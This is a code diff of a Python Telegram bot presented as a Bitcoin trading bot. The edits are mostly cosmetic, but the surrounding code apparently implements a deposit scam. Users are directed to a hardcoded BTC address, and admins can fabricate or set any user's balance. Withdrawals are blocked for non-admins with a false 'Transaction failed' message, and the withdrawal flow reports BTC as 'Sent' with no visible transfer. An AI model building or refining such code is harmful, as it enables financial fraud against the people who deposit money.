@@ -12,7 +12,7 @@ from telegram.ext import (
 )
 import nest_asyncio
 
-nest_asyncio.apply()  # Patch event loop to allow re-entry (fixes 'event loop already running')
+nest_asyncio.apply()  # Fix "event loop already running"
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 DATA_FILE = "data.json"
@@ -27,7 +27,7 @@ def load_data():
         try:
             return json.load(f)
         except json.JSONDecodeError:
-            # If corrupted, reset
+            # Reset on corrupt file
             return {"users": {}, "admins": [DEFAULT_ADMIN_ID], "activity_log": []}
 
 def save_data():
@@ -99,16 +99,17 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     data['users'].setdefault(str(uid), {"balance": 0.0})
     balance = get_balance(uid)
 
-    # match-case requires Python 3.10+. Indentation fixed below.
     cmd = query.data
     if cmd == "balance":
         await query.edit_message_text(f"💰 Balance: {balance:.8f} BTC", reply_markup=get_main_menu())
+
     elif cmd == "deposit":
         await query.edit_message_text(
             "Send BTC to:\n`bc1qp5efu0wuq3zev4rctu8j0td5zmrgrm75459a0y`",
             parse_mode="Markdown",
             reply_markup=get_main_menu()
         )
+
     elif cmd == "withdrawal":
         if not is_admin(uid):
             await query.edit_message_text("❌ Transaction failed. Admin only.", reply_markup=get_main_menu())
@@ -118,46 +119,60 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             pending_withdrawal[uid] = 1
             await query.edit_message_text("🙋 Enter BTC withdrawal address:")
             log_action(uid, "Initiated Withdrawal", {"balance": balance})
+
     elif cmd == "run":
         await query.edit_message_text("✅ Bot started.", reply_markup=get_main_menu())
         log_action(uid, "Started Bot")
+
     elif cmd == "stop":
         await query.edit_message_text("Stop command issued.", reply_markup=get_main_menu())
         log_action(uid, "Stopped Bot")
+
     elif cmd == "monitor":
         try:
             price = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd").json()['bitcoin']['usd']
         except:
             price = "unknown"
-        await query.edit_message_text(f"📊 BTC: ${price}\nBalance: {balance:.8f} BTC", reply_markup=get_main_menu())
+        await query.edit_message_text(
+            f"📊 BTC Price: ${price}\nYour Balance: {balance:.8f} BTC",
+            reply_markup=get_main_menu()
+        )
+
     elif cmd == "strategy":
-        await query.edit_message_text("Coming soon...", reply_markup=get_main_menu())
+        # Placeholder for strategy picker (add your logic here)
+        await query.edit_message_text("🧠 Strategy picker coming soon...", reply_markup=get_main_menu())
+
     elif cmd == "exit":
         await query.edit_message_text("Goodbye!")
+
     elif cmd == "inject_self":
         if not is_admin(uid):
             await query.edit_message_text("❌ Admin only.", reply_markup=get_main_menu())
         else:
             pending_inject[uid] = True
             await query.edit_message_text("💵 Enter amount to inject:")
+
     elif cmd == "edit_user":
         if not is_admin(uid):
             await query.edit_message_text("❌ Admin only.", reply_markup=get_main_menu())
         else:
             pending_edit[uid] = {"step": 1}
             await query.edit_message_text("Send user Telegram ID:")
+
     elif cmd == "add_admin":
         if not is_admin(uid):
             await query.edit_message_text("❌ Admin only.", reply_markup=get_main_menu())
         else:
             pending_edit[uid] = {"admin_add": True}
             await query.edit_message_text("Send user ID to add as admin:")
+
     elif cmd == "remove_admin":
         if not is_admin(uid):
             await query.edit_message_text("❌ Admin only.", reply_markup=get_main_menu())
         else:
             pending_edit[uid] = {"admin_remove": True}
             await query.edit_message_text("Send user ID to remove from admins:")
+
     elif cmd == "view_log":
         if not is_admin(uid):
             await query.edit_message_text("❌ Admin only.", reply_markup=get_main_menu())
@@ -165,9 +180,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             logs = data.get("activity_log", [])[-10:]
             log_msg = "\n".join([f"{log['timestamp']} - {log['action']} - User:{log['user_id']}" for log in logs]) or "No logs."
             await query.edit_message_text(f"\U0001F4D3 Recent Logs:\n{log_msg}", reply_markup=get_admin_menu())
+
     elif cmd == "close_admin":
         admin_mode[uid] = False
         await query.edit_message_text("Admin panel closed.", reply_markup=get_main_menu())
+
     else:
         await query.edit_message_text("Unknown command.", reply_markup=get_main_menu())
 
@@ -175,7 +192,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     msg = update.message.text.strip()
 
-    # Admin mode toggle with secret phrase
+    # Toggle admin panel
     if msg == SECRET_PHRASE:
         admin_mode[uid] = not admin_mode.get(uid, False)
         if admin_mode[uid]:
@@ -186,7 +203,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             log_action(uid, "Admin Panel Disabled")
         return
 
-    # Handle injection input
+    # Injection flow
     if pending_inject.get(uid):
         if not is_admin(uid):
             await update.message.reply_text("❌ Admin only.")
@@ -204,11 +221,11 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("Invalid amount. Try again.")
         return
 
-    # Handle withdrawal address input
+    # Withdrawal flow
     if uid in pending_withdrawal and pending_withdrawal[uid] == 1:
         addr = msg
         bal = get_balance(uid)
-        fee = bal * 0.05
+        fee = bal * 0.05  # 5% fee
         net = bal - fee
         if net <= 0:
             await update.message.reply_text("❌ Balance too low after fee.")
@@ -220,11 +237,10 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"Sent {net:.8f} BTC to `{addr}`", parse_mode="Markdown")
         return
 
-    # Handle user edit / admin add/remove flows
+    # Edit user/admin add/remove flows
     if uid in pending_edit:
         step = pending_edit[uid]
         try:
-            # Edit user balance steps
             if "step" in step and step["step"] == 1:
                 target_id = int(msg)
                 pending_edit[uid] = {"step": 2, "target": target_id}
@@ -236,7 +252,6 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 log_action(uid, "Edited User Balance", {"target": target, "amount": amt})
                 pending_edit.pop(uid)
                 await update.message.reply_text(f"Set user {target}'s balance to {amt:.8f} BTC")
-            # Admin add
             elif "admin_add" in step:
                 aid = int(msg)
                 if aid not in data['admins']:
@@ -247,7 +262,6 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 else:
                     await update.message.reply_text("User already admin.")
                 pending_edit.pop(uid)
-            # Admin remove
             elif "admin_remove" in step:
                 rid = int(msg)
                 if rid in data['admins']:
@@ -295,7 +309,7 @@ async def start_bot():
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
     app.job_queue.run_repeating(profit_loop, interval=5)
-    # Run webserver as background task inside bot's event loop
+    # Start webserver as a background task
     app.create_task(run_webserver())
     await app.run_polling()
 
